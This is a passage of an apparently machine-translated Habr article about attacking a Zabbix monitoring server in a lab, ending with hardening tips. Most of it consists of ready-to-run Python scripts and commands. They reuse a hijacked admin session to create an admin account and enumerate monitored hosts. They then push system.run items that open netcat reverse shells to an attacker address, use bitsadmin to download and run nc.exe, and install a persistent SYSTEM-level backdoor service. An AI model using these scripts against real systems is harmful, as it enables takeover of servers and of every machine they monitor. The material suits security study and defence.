class="hljs-string">"2.0"</span></span>,<span class="hljs-string"><span class="hljs-string">"method"</span></span>: <span class="hljs-string"><span class="hljs-string">"user.get"</span></span>,<span class="hljs-string"><span class="hljs-string">"params"</span></span>:{<span class="hljs-string"><span class="hljs-string">"output"</span></span>: <span class="hljs-string"><span class="hljs-string">"extend"</span></span>},<span class="hljs-string"><span class="hljs-string">"auth"</span></span>:<span class="hljs-string"><span class="hljs-string">"d547a4536e1660e753c765916d44531b"</span></span>,<span class="hljs-string"><span class="hljs-string">"id"</span></span>:<span class="hljs-number"><span class="hljs-number">1</span></span>}' http:<span class="hljs-comment"><span class="hljs-comment">//192.168.56.102/zabbix/api_jsonrpc.php</span></span></code> </pre> <br><br>  The result is successful: <br><pre> <code class="hljs json">{<span class="hljs-attr"><span class="hljs-attr">"jsonrpc"</span></span>:<span class="hljs-string"><span class="hljs-string">"2.0"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"result"</span></span>:[{<span class="hljs-attr"><span class="hljs-attr">"userid"</span></span>:<span class="hljs-string"><span class="hljs-string">"1"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"alias"</span></span>:<span class="hljs-string"><span class="hljs-string">"Admin"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"name"</span></span>:<span class="hljs-string"><span class="hljs-string">"Zabbix"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"surname"</span></span>:<span class="hljs-string"><span class="hljs-string">"Administrator"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"url"</span></span>:<span class="hljs-string"><span class="hljs-string">""</span></span>,<span class="hljs-attr"><span class="hljs-attr">"autologin"</span></span>:<span class="hljs-string"><span class="hljs-string">"1"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"autologout"</span></span>:<span class="hljs-string"><span class="hljs-string">"0"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"lang"</span></span>:<span class="hljs-string"><span class="hljs-string">"en_GB"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"refresh"</span></span>:<span class="hljs-string"><span class="hljs-string">"30"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"type"</span></span>:<span class="hljs-string"><span class="hljs-string">"3"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"theme"</span></span>:<span class="hljs-string"><span class="hljs-string">"default"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"attempt_failed"</span></span>:<span class="hljs-string"><span class="hljs-string">"0"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"attempt_ip"</span></span>:<span class="hljs-string"><span class="hljs-string">"192.168.56.100"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"attempt_clock"</span></span>:<span class="hljs-string"><span class="hljs-string">"1517561631"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"rows_per_page"</span></span>:<span class="hljs-string"><span class="hljs-string">"50"</span></span>},{<span class="hljs-attr"><span class="hljs-attr">"userid"</span></span>:<span class="hljs-string"><span class="hljs-string">"2"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"alias"</span></span>:<span class="hljs-string"><span class="hljs-string">"guest"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"name"</span></span>:<span class="hljs-string"><span class="hljs-string">""</span></span>,<span class="hljs-attr"><span class="hljs-attr">"surname"</span></span>:<span class="hljs-string"><span class="hljs-string">""</span></span>,<span class="hljs-attr"><span class="hljs-attr">"url"</span></span>:<span class="hljs-string"><span class="hljs-string">""</span></span>,<span class="hljs-attr"><span class="hljs-attr">"autologin"</span></span>:<span class="hljs-string"><span class="hljs-string">"0"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"autologout"</span></span>:<span class="hljs-string"><span class="hljs-string">"900"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"lang"</span></span>:<span class="hljs-string"><span class="hljs-string">"en_GB"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"refresh"</span></span>:<span class="hljs-string"><span class="hljs-string">"30"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"type"</span></span>:<span class="hljs-string"><span class="hljs-string">"1"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"theme"</span></span>:<span class="hljs-string"><span class="hljs-string">"default"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"attempt_failed"</span></span>:<span class="hljs-string"><span class="hljs-string">"0"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"attempt_ip"</span></span>:<span class="hljs-string"><span class="hljs-string">""</span></span>,<span class="hljs-attr"><span class="hljs-attr">"attempt_clock"</span></span>:<span class="hljs-string"><span class="hljs-string">"0"</span></span>,<span class="hljs-attr"><span class="hljs-attr">"rows_per_page"</span></span>:<span class="hljs-string"><span class="hljs-string">"50"</span></span>}],<span class="hljs-attr"><span class="hljs-attr">"id"</span></span>:<span class="hljs-number"><span class="hljs-number">1</span></span>}</code> </pre> <br>  The whole process can be viewed <a href="https://youtu.be/1qQhULjzzz4">here</a> . <br><br>  Conclusion is recommended to structure, for example, using <a href="https://jsoneditoronline.org/">such a service</a> . <br><br>  You can see all users (and guests too), their names and pseudonyms, the IP addresses from which users log in, and other interesting information that is available only to the Zabbix administrator.  Now that the attacker has the administrator's zbx_sessionid (the moral is not to sit under the administrator!) He can try to gain a foothold in the system. <br><br>  For starters, you can create yourself a new user with admin rights, so as not to depend on the intercepted zbx_sessionid.  To do this, you can use the following script: <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> json <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> requests <span class="hljs-keyword"><span class="hljs-keyword">from</span></span> pyzabbix <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> ZabbixAPI <span class="hljs-comment"><span class="hljs-comment">#api_address="http://192.168.56.102/zabbix/api_jsonrpc.php" api_address=raw_input("enter correct URL to api_jsonrpc.php, like http://192.168.56.102/zabbix/api_jsonrpc.php"": \n") zbx_sessionid= raw_input("enter zbx_sessionid: \n") user= raw_input("enter username: \n") password= raw_input("enter password: \n") url = api_address headers = {'Content-type': 'application/json'} data = {"jsonrpc": "2.0", "method": "user.create", "params": { "alias": user, "passwd": password, "type": "3", "usrgrps": [ {"usrgrpid": "7"}], }, "auth": zbx_sessionid, "id": 1 } answer = requests.post(url, data=json.dumps(data), headers=headers) print(answer) response = answer.json() print(response) ###Using pyzabbix to connect whith created user creds print ("testing user parameters:") zapi = ZabbixAPI(api_address) zapi.login(user, password) print("Connected to Zabbix API Version %s" % zapi.api_version())</span></span></code> </pre> <br>  The result is successful. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/n0/fb/2u/n0fb2u4vscsmhls5occsgzs6fo0.png"></div>  <i>Script result</i> <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/ru/xl/go/ruxlgorpvo3spdsiz0v7o06sgs8.png"></div>  <i>The interface shows the created user.</i> <br><br>  Conclusion - when intercepting the zbx_sessionid of the Zabbix administrator, the attacker has the same opportunities as the Zabbix administrator. <br><br>  The process itself can be found <a href="https://youtu.be/OwfCHiKY-cM">here</a> . <br>  By and large, this can and stop - the system is compromised.  But what happens if you develop an attack?  Is it possible to expand the attack area?  What are the consequences for those components that are monitored in Zabbix? <br><br><h4>  Gain access to computers and dock in the system </h4><br>  Now that the attacker has created his user with administrator rights in Zabbix, you can try to penetrate those PCs that Zabbix is ‚Äã‚Äãmonitoring. <br><br>  In Zabbix there is such a possibility as running remote commands.  This opportunity, we repeat, works as follows: <br><br><ul><li>  in the agent config, the parameter EnableRemoteCommands = 1 is specified. </li><li>  the server sends the command to the agent, it executes it and returns the result to the server. </li></ul><br>  The command length is limited to 255 characters.  Timeout commands - a maximum of 30 seconds, and the technology allows you to execute any command. <br><br>  The idea is to create a task on a monitored PC that will run a command on it like this: <b>‚ÄúC: \ Users \ Public \ nc.exe ‚ÄìdLp 6666 - e cmd.exe‚Äù</b> .  Next, you can try to connect to the created shell. <br><br>  The command will be executed with the rights that the Zabbix agent has in the system.  However, due to the peculiarities of the implementation of the remote commands mechanism, a steady shell attacker cannot hang up with a single task of the type <b>system.run ["C: \ Users \ Public \ nc.exe -dLp 6666 -e cmd.exe"]</b> cannot - it will break for Zabbix features (the value of the timeout option in the agent config is important). <br><br>  Based on the foregoing, the attacker's scenario will be as follows: <br><br><ol><li>  Intercept zbx_sessionid.  Next, create a new user with administrator rights (so as not to depend on the intercepted zbx_sessionid).  This has already been done. </li><li>  Create a task for each agent found on the PC server.  The task is to enable the launch of the shell, and use it to upload the shell to the victim's PC (or run an existing utility like netcat). </li><li>  Connect to the Zabbix shell created by the task and create another one that will not terminate due to the peculiarities of Zabbix. </li></ol><br>  Since the attacker has already created a user in Zabbix, you can use the parameters of the created user and the implementation of the Zabbix API in Python (pyzabbix package) in order not to bother with json and curl.  First you need to determine which computers are monitored by Zabbix: <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">from</span></span> pyzabbix <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> ZabbixAPI api_address=raw_input(<span class="hljs-string"><span class="hljs-string">"enter correct URL to api_jsonrpc.php, like http://192.168.56.102/zabbix/api_jsonrpc.php"</span></span><span class="hljs-string"><span class="hljs-string">": \n"</span></span>) zbx_sessionid= raw_input(<span class="hljs-string"><span class="hljs-string">"enter zbx_sessionid: \n"</span></span>) user= raw_input(<span class="hljs-string"><span class="hljs-string">"enter username: \n"</span></span>) password= raw_input(<span class="hljs-string"><span class="hljs-string">"enter password: \n"</span></span>) zapi = ZabbixAPI(api_address) zapi.login(user, password) print(<span class="hljs-string"><span class="hljs-string">"Connected to Zabbix API Version %s"</span></span> % zapi.api_version()) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> h <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> zapi.host.get(output=<span class="hljs-string"><span class="hljs-string">"extend"</span></span>): hostid=h[<span class="hljs-string"><span class="hljs-string">'hostid'</span></span>] host=h[<span class="hljs-string"><span class="hljs-string">'host'</span></span>] <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> (<span class="hljs-string"><span class="hljs-string">"found host: "</span></span>,host,<span class="hljs-string"><span class="hljs-string">"hostid: "</span></span>,hostid)</code> </pre> <br><div style="text-align:center;"><img src="https://habrastorage.org/webt/qj/v5/gj/qjv5gjm5zuuuewhvvrhozmdnao0.png"></div>  <i>Script result</i> <br><br>  Now, knowing the host name, you can set him the task of running a shell on a remote PC.  First, hang the shell on the Zabbix server.  The demonstration uses netcat, which is usually preinstalled in Linux.  <a href="https://github.com/lukecyca/pyzabbix/blob/master/examples/add_item.py">This</a> slightly modified example was used. <br><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">from</span></span> pyzabbix <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> ZabbixAPI, ZabbixAPIException <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> sys api_address=raw_input(<span class="hljs-string"><span class="hljs-string">"enter correct URL to api_jsonrpc.php, like http://192.168.56.102/zabbix/api_jsonrpc.php"</span></span><span class="hljs-string"><span class="hljs-string">": \n"</span></span>) user= raw_input(<span class="hljs-string"><span class="hljs-string">"enter username: \n"</span></span>) password= raw_input(<span class="hljs-string"><span class="hljs-string">"enter password: \n"</span></span>) hostname=raw_input(<span class="hljs-string"><span class="hljs-string">"enter hostname: \n"</span></span>) <span class="hljs-comment"><span class="hljs-comment"># hostid=raw_input("enter hostid: \n") zapi = ZabbixAPI(api_address) # Login to the Zabbix API zapi.login(user, password) host_name = hostname hosts = zapi.host.get(filter={"host": host_name}, selectInterfaces=["interfaceid"]) if hosts: host_id = hosts[0]["hostid"] print("Found host id {0}".format(host_id)) try: item = zapi.item.create( hostid=host_id, name='netcat_create_reverse_shell', key_='system.run["nc 192.168.56.100 4444 -e /bin/bash"]', type=0, value_type=4, interfaceid=hosts[0]["interfaces"][0]["interfaceid"], delay=5 ) except ZabbixAPIException as e: print(e) sys.exit() print("Added item with itemid {0} to host: {1}".format(item["itemids"][0], host_name)) else: print("No hosts found")</span></span></code> </pre> <br><img src="https://habrastorage.org/webt/th/jz/yb/thjzybz-_46hob-mxqam9lp_zma.png"><br>  <i>Script result</i> <br><br><img src="https://habrastorage.org/webt/-e/bv/8x/-ebv8x1qamccfqwohr_vtyj_-i8.png"><br>  <i>How it looks in the web interface</i> <br><br><img src="https://habrastorage.org/webt/nr/dx/_t/nrdx_tgfbsrif6q8docny9xvt8c.png"><br>  <i>The result of connecting to the created shell</i> <br><br>  As a result, a shell was received with the rights of the user who runs the Zabbix agent. <br>  But this shell is not constant, so you need to try to create on its basis a new shell, which will no longer depend on the parameters of Zabbix.  This can be done in different ways, one of which is to create a script that runs at a specific time (using the at command, for example). <br><br>  The process itself can be found <a href="https://youtu.be/Vw_AvSlB7f0">here</a> . <br><br>  However, the most interesting way will be considered for Windows, because by default in Windows Zabbix agent is installed and started as a service with System privileges. <br><br><img src="https://habrastorage.org/webt/pz/qp/7j/pzqp7j-cqercrjc9aitizhnl7ns.png"><br>  <i>Zabbix agent rights</i> <br><br>  With this in mind, any application launched by the agent will also run with System privileges.  The attack vector will be somewhat more complicated: <br><br><ol><li>  We start port wiretapping in kali: <br><br><pre> <code class="bash hljs"><span class="hljs-comment"><span class="hljs-comment"># nc -lvvnp 5555</span></span></code> </pre> </li><li>  Using Zabbix, we create a task that downloads the shell utility to the victim‚Äôs computer (we will use netcat for Windows) from the attacker's computer (using bitsadmin, you will have to configure Apache to download Kali - and do not forget to start it!): </li></ol><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">from</span></span> pyzabbix <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> ZabbixAPI, ZabbixAPIException <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> sys api_address=raw_input(<span class="hljs-string"><span class="hljs-string">"enter correct URL to api_jsonrpc.php, like http://192.168.56.102/zabbix/api_jsonrpc.php"</span></span><span class="hljs-string"><span class="hljs-string">": \n"</span></span>) user= raw_input(<span class="hljs-string"><span class="hljs-string">"enter username: \n"</span></span>) password= raw_input(<span class="hljs-string"><span class="hljs-string">"enter password: \n"</span></span>) host_name=raw_input(<span class="hljs-string"><span class="hljs-string">"enter hostname: \n"</span></span>) <span class="hljs-comment"><span class="hljs-comment"># hostid=raw_input("enter hostid: \n") zapi = ZabbixAPI(api_address) # user='Admin', password='zabbix') # Login to the Zabbix API zapi.login(user, password) # host_name = 'Zabbix_server' # host_name = "windows host" hosts = zapi.host.get(filter={"host": host_name}, selectInterfaces=["interfaceid"]) if hosts: host_id = hosts[0]["hostid"] print("Found host id {0}".format(host_id)) try: item = zapi.item.create( hostid=host_id, name='netcat_create_reverse_shell', key_='system.run["bitsadmin.exe /transfer /download http://192.168.56.100/nc.exe C:\\Temp\\nc.exe &amp;&amp; C:\Temp\\nc.exe 192.168.56.100 5555 -e cmd.exe"]', type=0, value_type=4, interfaceid=hosts[0]["interfaces"][0]["interfaceid"], delay=30 ) except ZabbixAPIException as e: print(e) sys.exit() print("Added item with itemid {0} to host: {1}".format(item["itemids"][0], host_name)) else: print("No hosts found")</span></span></code> </pre> <br><img src="https://habrastorage.org/webt/t3/3w/ku/t33wkukyuqcc9rkjp1-efqy_luw.png"><br>  <i>Script result</i> <br><br><img src="https://habrastorage.org/webt/pl/3h/vm/pl3hvmxlcb6arrli35mhhuzmbtw.png"><br>  <i>Zabbix Reaction</i> <br><br><img src="https://habrastorage.org/webt/cg/rn/nq/cgrnnqz2_1jfzg_a43di03owwjo.png"><br>  <i>Shell check</i> <br><br>  The shell is received with the System parameters, however it will be interrupted periodically.  This is due to the Timeout parameter, which by default is not defined in the agent config and is 3s.  During this time, a complex team simply will not have time to be executed.  Therefore, the Timeout parameter was taken as 30s, which was warned at the beginning of the article. <br><br>  In principle, the attacker himself can add the value of the option Timeout = 30 (by default, the option Timeout is commented out), simply by adding the line Timeout = 30 to the end of the zabbix_agentd.conf file.  The agent is running as a service - therefore, it can change the file, it is enough to register the corresponding task on the server.  For example, add an item, which will use the remote commands to add the necessary lines to the end of the configuration file. <br><br>  Now we need to try to create a permanent shell, for which we will create a service (the rights allow), which will also raise the tunnel using nc.  Let's create a command to create a service, save it to a file, and then redirect it to the nc input (service.txt file): <br><br><pre> <code class="hljs sql">sc <span class="hljs-keyword"><span class="hljs-keyword">create</span></span> reversencbackdoor binpath= <span class="hljs-string"><span class="hljs-string">"cmd /CC:\Users\Public\nc.exe 192.168.56.100 6666 -e cmd.exe"</span></span> <span class="hljs-keyword"><span class="hljs-keyword">type</span></span>= own <span class="hljs-keyword"><span class="hljs-keyword">start</span></span>= <span class="hljs-keyword"><span class="hljs-keyword">auto</span></span> DisplayName= <span class="hljs-string"><span class="hljs-string">"NC service backdoor"</span></span></code> </pre> <br>  To manage the service, we use a similar approach by changing some commands (the service_run.txt file): <br><br><ul><li>  sc query reversencbackdoor </li><li>  sc stop reversencbackdoor </li><li>  sc start reversencbackdoor </li></ul><br><img src="https://habrastorage.org/webt/5g/t_/j4/5gt_j4z4truy-eved_mntd-qiva.png"><br>  <i>The result is a successful service creation.</i> <br><br>  We will try to connect to the created service: we enable listening on port 6666 and start the service; without this, it starts and immediately ends its work. <br><br><img src="https://habrastorage.org/webt/ti/cv/li/ticvlias0eyihp7eky3frzfxwaa.png"><br>  <i>Enable listening</i> <br><br><img src="https://habrastorage.org/webt/px/ly/pi/pxlypio0bdwumtnszrrcuwur0y4.png"><br>  <i>In another window we send the service a command to launch</i> <br><br>  On port 5555, the nc program is started by the Zabbix agent, therefore, the shell terminates, as noted above, due to the nature of the command execution timeout by the agent.  And the service starts with the System parameters - and the shell does not terminate. <br><br><img src="https://habrastorage.org/webt/ti/cv/li/ticvlias0eyihp7eky3frzfxwaa.png"><br>  <i>Breakout Shell</i> <br><br>  The process itself can be found <a href="https://youtu.be/5Rs8x7Mo7S4">here</a> . <br><br><h4>  What conclusions can be drawn from the above? </h4><br><ol><li>  With certain settings, an attacker can intercept zbx_sessionid and gain a foothold in the Zabbix system. </li><li>  Using the features of Zabbix agent operation, an attacker (with certain agent settings) can penetrate all PCs that are monitored by a Zabbix server. </li></ol><br>  As always, the legs of most security threats grow out of configuration errors, and the monitoring system is such a component, the wrong (from a security point of view) configuration of which can critically affect the security of all network components. <br>  Therefore it is necessary to attend to the protection of transmitted data. <br><br>  Here are some tips for setting up a Zabbix server: <br><br><ul><li>  Make life difficult for the attacker - do not use the standard ports for the Zabbix server to work. </li><li>  Remove the utilities from the server that will allow the attacker to quickly forward the tunnel.  In general, it is necessary to clean the server of unnecessary utilities that can be used by an attacker. </li><li>  Share user account privileges in Zabbix.  Disable unused accounts on the Zabbix server (guest should be turned off first);  if possible, make a separate account for monitoring parameters and a separate one for administration, do not forget to periodically change the password for the accounts and close the admin session after working in the web interface (zbx_sessionid is reset). </li><li>  Set up event auditing in Zabbix server to record and track security events, read about the settings <a href="https://www.zabbix.com/documentation/3.0/ru/manual/web_interface/frontend_sections/reports/audit">here</a> . </li><li>  If possible, isolate the Zabbix server from those components that an attacker can use as an entry point into the corporate network.  For example, take out the Zabbix server in the DMZ and configure the Zabbix proxy to send information to it.  Read more about Zabbix proxy <a href="https://www.zabbix.com/documentation/3.0/ru/manual/distributed_monitoring/proxies">here</a> . </li><li>  Configure sending alerts about critical events, for this Zabbix has quite ample opportunities </li></ul><br>  Zabbix agent security also requires close attention: <br><br><ul><li>  Make life difficult for the attacker; do not use the standard ports for Zabbix agent to work. </li><li>  On Windows, the Zabbix agent runs as a service, it is better to make a separate user for it.  Otherwise, the service will be started with the system account settings. </li><li>  Think about it, do you really need to run remote commands using Zabbix?  If not, disable this feature. </li><li>  Configure data encryption in the agent config. </li></ul><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Setting up secure access and improving security in Zabbix is ‚Äã‚Äãthe topic of a separate article (and perhaps not one), there will be time - I will definitely write about it. </font></font><br><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS Many thanks </font></font><a href="https://habrahabr.ru/users/sabotaged/" class="user_link"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sabotaged</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> for help in preparing the article!</font></font></div><p>Source: <a href="https://habr.com/ru/post/350108/">https://habr.com/ru/post/350108/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../350098/index.html">Second breath multimode</a></li>
<li><a href="../350100/index.html">How to come up with ideas for patents</a></li>
<li><a href="../350102/index.html">How we searched for a translator in the section "Songs"</a></li>
<li><a href="../350104/index.html">Innovative 3D XPoint memory: technology potential and development prospects</a></li>
<li><a href="../350106/index.html">Custom animations in the mobile application</a></li>
<li><a href="../350114/index.html">Android data migration tools and improved application support</a></li>
<li><a href="../350116/index.html">Open lesson on "Introduction to JSON Schema"</a></li>
<li><a href="../350118/index.html">Features of the national hunting for bugs or Bug Bounty in Slavic</a></li>
<li><a href="../350120/index.html">Object classification in real time</a></li>
<li><a href="../350124/index.html">Online shooter on Unreal Engine 4 for 90 hours (video creation + source)</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>